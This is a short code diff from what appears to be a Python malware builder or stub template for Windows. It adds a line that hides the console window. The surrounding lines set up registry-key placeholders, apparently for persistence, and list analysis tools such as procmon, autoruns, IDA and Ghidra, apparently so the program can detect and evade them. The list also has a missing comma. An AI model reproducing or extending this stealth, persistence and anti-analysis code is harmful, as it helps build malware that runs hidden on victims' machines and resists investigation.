@@ -71,6 +71,8 @@ import time
 import signal
 from base64 import b64decode
 import winreg
+from ctypes import windll
+windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), {hide})
 reg_path = f"{TypicalRegistryKey}"
 reg_key = f"{our_reg_key}"
 debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
